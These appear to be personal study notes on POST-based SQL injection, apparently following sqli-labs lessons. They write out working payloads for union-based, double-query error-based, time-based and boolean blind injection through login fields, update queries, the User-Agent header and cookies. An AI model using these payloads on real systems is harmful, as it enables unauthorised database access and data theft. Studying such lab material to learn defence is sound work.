# POST SQLI

Here the methods are mostly the same but we're providing some data in an input field like username and password, like we're providing some data over post request usually from a form element.

In lesson 11 lets construct a query that the developer may have created

select username,password from users where username='$uname' and password='$password'

So when we give a payload like this -> ' select 1,database(),version() # in the username field the final query would be as follows

select username,password from users where username='' select 1,database(),version() #' and password='$password'

So the first select statement evaluates to false and the second select statement evaluates to true

Now, we can just get all the data we want since we now know the injection points


## Double query injection

Lesson 14

lets consider this query -> select concat('~',(select database()),'~',floor(rand(0)*2)) from information_schema.tables;

+------------------------------------------------------+
| concat('~',(select database()),'~',floor(rand(0)*2)) |
+------------------------------------------------------+
| ~test~0                                              |
| ~test~1                                              |
| ~test~1                                              |
| ~test~0                                              |
the table continues..(doubt)

Now consider this query 

" and (select 1 from (select count(*),(concat('~',(select database()),'~',floor(rand(0)*2)))c from information_schema.tables group by c)a) #

This query will dump us an error like this -> Duplicate entry '~security~1' for key 'group_key', (doubt)

hence we get the database name we can enumerate further from here by the various techniques that we have learned.


# Injection in update query


This is based on lesson 17 

The level is updating the password of an existing user a typical use of update query

So the query might look like this

update users set password='$userinput' and username '$userinput';

so since the website is not showing any sort of output here we have to rollback to using double query injection so our payload will look as follows

' and (select 1 from (select count(*),(concat('~',(select database()),'~',floor(rand(0)*2)))c from information_schema.tables group by c)a) #

Thus from here further extraction is possible.


# Blind Boolean and Time

based on lesson 16

Lets construct a basic query intended by the developer

select username,password from users where username=("$userinput") and password=("$userinput");

So a time based injection's payload would look like the following 

admin") and (select if(database()='security',sleep(2),null)) #


Similarily a payload in boolean blind would like the following

admin") and (select database()='security') #


And this could be combined with the boolean and time based payloads that we discussed in previous lessons to make powerful versions of the same.


# Injection in insert query

Here the injection is in the user agent field this is good to know as it would be helpful in some ctfs but i doubt it's of any practical application tho

Here the insert query is as follows
 
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname);

This will only work for already logged in users tho 

Now using burp suite or some other intercepting tool we can modify the user agent, and we can give a double query payload to get the required information.


# Injection in cookie value.

based on lesson 20 and 21

Normal union error based injection  but here we are putting our payloads in the cookie field using some intercepting proxy like burp
